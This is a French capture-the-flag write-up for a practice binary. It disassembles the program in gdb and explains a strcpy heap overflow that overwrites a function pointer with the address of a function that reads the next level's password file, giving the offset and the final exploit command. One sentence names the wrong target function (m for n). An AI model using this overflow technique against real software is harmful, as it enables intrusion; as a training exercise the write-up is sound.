./level6 -> segfault
./level6 test -> Nope

disas main :
   0x0804847c <+0>:	    push   %ebp
   0x0804847d <+1>:	    mov    %esp,%ebp
   0x0804847f <+3>:	    and    $0xfffffff0,%esp
   0x08048482 <+6>:	    sub    $0x20,%esp
   0x08048485 <+9>:	    movl   $0x40,(%esp)
   0x0804848c <+16>:	call   0x8048350 <malloc@plt> -> malloc de 64
   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
   0x08048495 <+25>:	movl   $0x4,(%esp)
   0x0804849c <+32>:	call   0x8048350 <malloc@plt> -> malloc de 4
   0x080484a1 <+37>:	mov    %eax,0x18(%esp)
   0x080484a5 <+41>:	mov    $0x8048468,%edx -> 0x8048468 est l´adresse de m
   0x080484aa <+46>:	mov    0x18(%esp),%eax
   0x080484ae <+50>:	mov    %edx,(%eax)
   0x080484b0 <+52>:	mov    0xc(%ebp),%eax
   0x080484b3 <+55>:	add    $0x4,%eax
   0x080484b6 <+58>:	mov    (%eax),%eax
   0x080484b8 <+60>:	mov    %eax,%edx
   0x080484ba <+62>:	mov    0x1c(%esp),%eax
   0x080484be <+66>:	mov    %edx,0x4(%esp)
   0x080484c2 <+70>:	mov    %eax,(%esp)
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt> -> overflow possible
   0x080484ca <+78>:	mov    0x18(%esp),%eax -> eax = "test" (string donnée en param)
   0x080484ce <+82>:	mov    (%eax),%eax 
   0x080484d0 <+84>:	call   *%eax -> *$eax : appelle la fonction pointée par eax
                                x $eax : 0x8048468 <m>:	0x55  -> eax pointe sur m     
   0x080484d2 <+86>:	leave  
   0x080484d3 <+87>:	ret 

info function -> revele fonction n et m

disas n :
   0x08048454 <+0>:	    push   %ebp
   0x08048455 <+1>:	    mov    %esp,%ebp
   0x08048457 <+3>:	    sub    $0x18,%esp
   0x0804845a <+6>:	    movl   $0x80485b0,(%esp) -> x/s 0x80485b0 :
                                                    "/bin/cat /home/user/level7/.pass"
   0x08048461 <+13>:	call   0x8048370 <system@plt>
   0x08048466 <+18>:	leave  
   0x08048467 <+19>:	ret   

disas m:
   0x08048468 <+0>:	    push   %ebp
   0x08048469 <+1>:	    mov    %esp,%ebp
   0x0804846b <+3>:	    sub    $0x18,%esp
   0x0804846e <+6>:	    movl   $0x80485d1,(%esp) ->x/s 0x80485d1 : "Nope"
   0x08048475 <+13>:	call   0x8048360 <puts@plt>
   0x0804847a <+18>:	leave  
   0x0804847b <+19>:	ret    

L´objectif est de changer l´adresse du pointeur sur fonction par celle de n avec un heap 
overflow grace à strcpy. Mon pointeur sur fonction est stocké juste après ma sting dans la
memoire. Grace au strcpy, qui ne verifie pas la longueur de ce qu´il copie, on va pouvoir 
changer ce qui est stocké dans le pointeur sur fonction (qui est l´adresse de m) par 
l´adresse de m. Quand le pointeur sur fonction sera appelé après le strcpy il appelera notre
fonction n au lieu de m.

Sous gdb on a mis un breakpoint au niveau de l´appel du pointeur sur fonction pour
trouver à partir de combien de character on re-ecrivait l´adresse du pointeur. Avec 73 ´A´
on obtenait : 
x $eax :
   0x8040041:	Cannot access memory at address 0x8040041 -> 41 c´est notre A !

On a donc enlevé un character et ajouté notre adresse et on a obtenu : 
x $eax
   0x8048454 <n>:	0x83e58955 -> Bingo !

Il y a plus qu´a lancer le script hors gdb pour obtenir le flag :
./level6 `cat /tmp/exploit6`
